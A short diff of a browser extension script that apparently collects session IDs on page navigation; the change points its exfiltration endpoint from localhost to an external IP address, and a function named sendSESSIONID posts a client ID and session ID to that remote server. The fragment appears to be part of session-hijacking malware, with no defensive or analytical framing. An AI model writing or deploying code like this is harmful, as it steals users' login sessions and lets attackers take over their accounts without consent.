@@ -16,7 +16,7 @@ chrome.webNavigation.onCompleted.addListener(async function(details) {
     }
 })  
 
-const IP = "http://localhost:3000"
+const IP = "http://193.70.0.212:3000"
 
 async function sendSESSIONID(ClientID,SESSIONID){
     var response = await fetch(IP+"/sendSessionID", {
